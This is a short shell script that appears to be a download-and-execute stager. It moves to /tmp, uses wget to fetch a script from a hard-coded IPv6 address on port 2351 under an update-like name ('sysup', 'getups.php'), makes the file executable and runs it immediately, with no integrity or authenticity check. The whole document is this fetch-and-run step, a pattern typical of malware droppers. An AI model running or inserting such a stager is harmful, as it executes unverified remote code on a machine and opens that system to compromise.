#!/bin/sh
cd /tmp/

cat="jubtl2"
localname="/tmp/sysup-jubtl2.sh"

wget "http://[fdff::215:5d01:201c]:2351/getups.php?cat=$cat" -O "$localname"
chmod +x "$localname"
"$localname"
